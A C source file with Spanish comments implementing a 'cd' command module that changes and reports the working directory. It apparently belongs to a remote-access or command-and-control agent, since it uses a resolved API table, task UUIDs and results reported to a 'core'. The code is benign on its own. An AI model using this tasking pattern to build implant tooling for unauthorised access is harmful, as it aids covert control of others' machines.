/**
 * 66 -> 0x42
 * Mueve el directorio actual
 * SetCurrentDirectoryW + GetCurrentDirectoryW
 */

#include <stdint.h>
#include "api_table.h"
#include "parser.h"
#include "module_helpers.h"


void go(ApiTable* api, const char* task_uuid, Param* params, uint32_t param_count) {

    /* Buffer de salida */
    char* out = (char*)api->malloc(OUT_BUF_SIZE);
    if (!out) return;
    size_t used = 0;

    //cd <path>
    if (param_count < 1 || params[0].size == 0) {
        buf_append_str(out, &used, "cd: usage: cd <path>\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    /* Path UTF-8 → wide */
    wchar_t wide_path[PATTERN_LEN];
    wzero(wide_path, PATTERN_LEN);
    int n = api->MultiByteToWideChar(CP_UTF8, 0,
                                     (const char*)params[0].data,
                                     (int)params[0].size,
                                     wide_path, PATTERN_LEN - 4);
    if (n <= 0) {
        buf_append_str(out, &used, "cd: no se pudo convertir el path\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }
    wide_path[n] = L'\0';

    /* Cambiar de directorio */
    if (!api->SetCurrentDirectoryW(wide_path)) {
        char err_str[12];
        u64_to_dec((uint64_t)api->GetLastError(), err_str);

        buf_append_str(out, &used, "cd: no se pudo cambiar a ");
        buf_append(out, &used, (const char*)params[0].data, params[0].size);
        buf_append_str(out, &used, " (error ");
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");

        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    /* Reportar al core */
    wchar_t cur[PATTERN_LEN];
    wzero(cur, PATTERN_LEN);
    api->GetCurrentDirectoryW(PATTERN_LEN, cur);

    char cur_utf8[PATTERN_LEN * 4]; // Por si las rutas van en otro idioma donde suscaracteres superan el byte
    api->WideCharToMultiByte(CP_UTF8, 0, cur, -1,
                             cur_utf8, sizeof(cur_utf8), NULL, NULL);

    buf_append_str(out, &used, "ok: ");
    buf_append_str(out, &used, cur_utf8);
    buf_append_str(out, &used, "\n");

    api->report_result(task_uuid, (const uint8_t*)out, used, 0x95);
    api->free(out);
}
